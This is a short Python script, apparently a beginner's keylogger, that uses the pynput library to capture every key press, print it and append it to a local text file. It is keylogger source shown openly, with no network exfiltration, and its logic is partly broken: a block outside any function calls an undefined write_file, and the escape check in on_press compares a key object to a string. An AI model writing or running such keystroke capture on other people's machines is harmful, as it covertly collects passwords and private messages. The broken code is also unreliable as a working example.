import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []
log = open("OutputLoggedKeys.txt", "w")

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print ("{0} pressed".format(key))
    log.write(str("\n{0} pressed".format(key)))
    if key=="Key.esc":
        log.close()

if count >= 10:
    count = 0
    write_file(keys)
    keys = []

def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
